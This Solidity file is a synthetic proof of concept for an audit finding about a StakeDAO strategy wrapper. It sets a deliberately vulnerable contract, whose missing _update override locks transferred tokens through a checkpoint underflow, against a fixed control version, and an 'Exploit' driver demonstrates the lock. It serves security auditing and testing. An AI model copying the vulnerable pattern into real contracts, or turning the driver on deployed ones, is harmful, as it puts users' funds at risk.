// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of StakeDAO finding 63599 (C-02):
// "Checkpoints are almost always outdated due to missing `_update` override".
//
// The StakeDAO strategy wrapper is an OZ-style ERC20 that also keeps a per-user
// reward/collateral checkpoint (`userCheckpoints[user].balance`). Deposit and
// withdraw update the checkpoint using `msg.sender`, but the ERC20 transfer hook
// `_update` is NOT overridden. Therefore a plain `transfer` (e.g. the strategy
// token being moved as Morpho Blue collateral during a liquidation) moves the
// ERC20 balance WITHOUT creating a checkpoint for the recipient.
//
// When the recipient later tries to redeem/withdraw, the wrapper runs the
// verbatim buggy line:
//
//        UserCheckpoint storage checkpoint = userCheckpoints[msg.sender];
//        checkpoint.balance -= amount; // revert here due to underflow
//
// The recipient's checkpoint balance is 0, so the subtraction underflows and the
// call reverts (Panic 0x11). The recipient holds the strategy tokens but can
// NEVER redeem them for the underlying — the tokens are permanently locked.
//
// The FIX (negative control below) overrides `_update` so every balance
// movement — including a plain transfer — carries the checkpoint with it, and the
// recipient's redeem succeeds.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful ERC20 double used for the wrapper's underlying (LP /
///      collateral) asset and for the harm-marker token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal OZ-v5-style ERC20 base. `_update` is the single hook every
// mint / burn / transfer routes through — exactly as in OpenZeppelin's ERC20.
// It is declared `virtual` so a subclass may override it to keep extra
// accounting (checkpoints) in sync. The StakeDAO wrapper fails to do so.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract ERC20Base {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    /// @notice The one hook all balance movements pass through (OZ ERC20 v5).
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            totalSupply += value;
        } else {
            _balances[from] -= value;
        }
        if (to == address(0)) {
            totalSupply -= value;
        } else {
            _balances[to] += value;
        }
    }

    function _mint(address to, uint256 value) internal {
        _update(address(0), to, value);
    }

    function _burn(address from, uint256 value) internal {
        _update(from, address(0), value);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _update(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] -= value;
        _update(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: the StakeDAO strategy wrapper. Checkpoints are updated
// only in deposit / redeem (keyed by msg.sender). `_update` is NOT overridden,
// so transfers move ERC20 balances without touching checkpoints.
// ─────────────────────────────────────────────────────────────────────────────
contract StrategyWrapper is ERC20Base {
    struct UserCheckpoint {
        uint256 balance;
        uint256 rewardIntegral;
    }

    mapping(address => UserCheckpoint) public userCheckpoints;
    MiniToken public underlying;

    constructor(address _underlying) ERC20Base("StakeDAO Strategy Wrapper", "sdWRAP") {
        underlying = MiniToken(_underlying);
    }

    /// @notice Deposit underlying, mint wrapper tokens, and checkpoint msg.sender.
    function deposit(uint256 amount) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
        UserCheckpoint storage checkpoint = userCheckpoints[msg.sender];
        checkpoint.balance += amount;
    }

    /// @notice Redeem wrapper tokens for underlying, decrementing the checkpoint.
    function redeem(uint256 amount) external {
        UserCheckpoint storage checkpoint = userCheckpoints[msg.sender];
        checkpoint.balance -= amount; // @> revert here due to underflow
        _burn(msg.sender, amount);
        underlying.transfer(msg.sender, amount);
    }

    // NOTE: `_update` is intentionally NOT overridden here — this is the bug.
    // A plain `transfer` therefore moves `_balances` but never creates or moves
    // a checkpoint for the recipient.
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): identical, except `_update` is overridden
// so checkpoints follow EVERY balance movement, including plain transfers.
// This is exactly the auditor's recommendation ("Override `_update` function and
// update checkpoints in there").
// ─────────────────────────────────────────────────────────────────────────────
contract StrategyWrapperFixed is ERC20Base {
    struct UserCheckpoint {
        uint256 balance;
        uint256 rewardIntegral;
    }

    mapping(address => UserCheckpoint) public userCheckpoints;
    MiniToken public underlying;

    constructor(address _underlying) ERC20Base("StakeDAO Strategy Wrapper", "sdWRAP") {
        underlying = MiniToken(_underlying);
    }

    function deposit(uint256 amount) external {
        underlying.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
        UserCheckpoint storage checkpoint = userCheckpoints[msg.sender];
        checkpoint.balance += amount;
    }

    function redeem(uint256 amount) external {
        UserCheckpoint storage checkpoint = userCheckpoints[msg.sender];
        checkpoint.balance -= amount;
        _burn(msg.sender, amount);
        underlying.transfer(msg.sender, amount);
    }

    /// @notice FIX: carry the checkpoint on every transfer. Mint (from == 0) and
    ///         burn (to == 0) are already accounted explicitly in deposit/redeem,
    ///         so only the transfer leg (both non-zero) needs syncing here.
    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        if (from != address(0) && to != address(0)) {
            userCheckpoints[from].balance -= value;
            userCheckpoints[to].balance += value;
        }
    }
}

interface IWrapper {
    function deposit(uint256 amount) external;
    function redeem(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IApprovable {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Distinct on-chain actor so the wrapper sees separate `msg.sender`s
///      (checkpoints are keyed by msg.sender). Cheatcode-free stand-in for
///      `vm.prank`.
contract Actor {
    function approve(address token, address spender, uint256 amount) external {
        IApprovable(token).approve(spender, amount);
    }

    function deposit(address wrapper, uint256 amount) external {
        IWrapper(wrapper).deposit(amount);
    }

    function transferWrapped(address wrapper, address to, uint256 amount) external {
        IWrapper(wrapper).transfer(to, amount);
    }

    /// @return ok true iff redeem succeeded; false if it reverted (the bug).
    function tryRedeem(address wrapper, uint256 amount) external returns (bool ok) {
        try IWrapper(wrapper).redeem(amount) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: Alice deposits (checkpoint set), Alice transfers the strategy
// tokens to Bob (simulating a Morpho Blue collateral move / liquidation seizure),
// then Bob's redeem reverts on the checkpoint underflow — his tokens are locked.
// The locked magnitude is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant DEPOSIT_AMOUNT = 1_000 ether;

    // Exposed results for the driver / Playground.
    address public wrapperAddr;
    address public markerAddr;
    address public aliceAddr;
    address public bobAddr;
    bool public bobRedeemReverted;
    uint256 public lockedBalance;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        // --- deploy everything, fixed order, marker LAST ---
        MiniToken underlying = new MiniToken("Curve LP", "crvLP");            // nonce 1
        StrategyWrapper wrapper = new StrategyWrapper(address(underlying));    // nonce 2
        Actor alice = new Actor();                                            // nonce 3
        Actor bob = new Actor();                                              // nonce 4
        MiniToken marker = new MiniToken("Locked Strategy Token", "LOCKED-STRATEGY-TOKEN"); // nonce 5 (LAST)

        wrapperAddr = address(wrapper);
        markerAddr = address(marker);
        aliceAddr = address(alice);
        bobAddr = address(bob);

        uint256 amount = DEPOSIT_AMOUNT;

        // --- Alice acquires underlying and deposits -> checkpoint set for Alice ---
        underlying.mint(address(alice), amount);
        alice.approve(address(underlying), address(wrapper), amount);
        alice.deposit(address(wrapper), amount);

        // --- Alice transfers the wrapper tokens to Bob. Because `_update` is NOT
        //     overridden, Bob receives the ERC20 balance but gets NO checkpoint.
        //     (Stands in for the strategy token being seized as Morpho collateral.)
        alice.transferWrapped(address(wrapper), address(bob), amount);

        // --- Bob now holds the tokens but has no checkpoint. redeem() underflows. ---
        bool redeemed = bob.tryRedeem(address(wrapper), amount);
        bobRedeemReverted = !redeemed;
        require(bobRedeemReverted, "expected Bob redeem to revert (checkpoint underflow)");

        // --- Bob's tokens are permanently locked: he holds them but cannot redeem. ---
        lockedBalance = wrapper.balanceOf(address(bob));
        require(lockedBalance == amount, "Bob should still hold the locked tokens");

        // --- Record the locked magnitude on the marker token, minted to the SINK. ---
        marker.mint(SINK, lockedBalance);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
